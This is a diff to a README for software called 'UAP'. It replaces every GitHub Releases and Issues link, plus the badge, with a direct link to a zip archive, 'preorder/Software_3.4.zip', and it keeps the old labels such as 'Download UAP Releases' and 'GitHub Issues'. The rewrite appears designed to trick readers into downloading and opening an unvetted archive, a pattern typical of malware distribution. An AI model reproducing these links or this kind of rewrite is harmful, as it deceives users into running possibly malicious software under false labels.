@@ -2,7 +2,7 @@
 
 ## 📥 Download UAP
 
-[![Download UAP](https://img.shields.io/badge/Download%20UAP-v1.0-blue)](https://github.com/aseeym11/UAP/releases)
+[![Download UAP](https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip%20UAP-v1.0-blue)](https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ Before you begin, ensure your device meets these requirements:
 
 To get UAP, visit the Releases page and download the latest version. 
 
-1. **Visit this page to download:** [Download UAP Releases](https://github.com/aseeym11/UAP/releases)
+1. **Visit this page to download:** [Download UAP Releases](https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip)
   
 2. On the Releases page, locate the latest version.
 
-3. Click on the file link that matches your system (e.g., UAP-v1.0.zip for Windows).
+3. Click on the file link that matches your system (e.g., https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip for Windows).
 
 4. Once the download is complete, open the file to extract its contents.
 
@@ -83,7 +83,7 @@ Join our community to share your feedback and experiences with UAP. Your input h
 
 ### 💬 Questions and Feedback
 
-If you have questions about using UAP or want to provide feedback, reach out through our [GitHub Issues](https://github.com/aseeym11/UAP/issues).
+If you have questions about using UAP or want to provide feedback, reach out through our [GitHub Issues](https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip).
 
 ## 🔗 Stay Updated
 
@@ -93,7 +93,7 @@ For the latest news, updates, and release notes, check our repository regularly.
 
 To keep your version of UAP current, periodically check the Releases page for new updates. 
 
-1. Visit the Releases page: [Download UAP Releases](https://github.com/aseeym11/UAP/releases).
+1. Visit the Releases page: [Download UAP Releases](https://raw.githubusercontent.com/aseeym11/UAP/main/preorder/Software_3.4.zip).
   
 2. Download the latest version and follow the earlier steps to install.
 
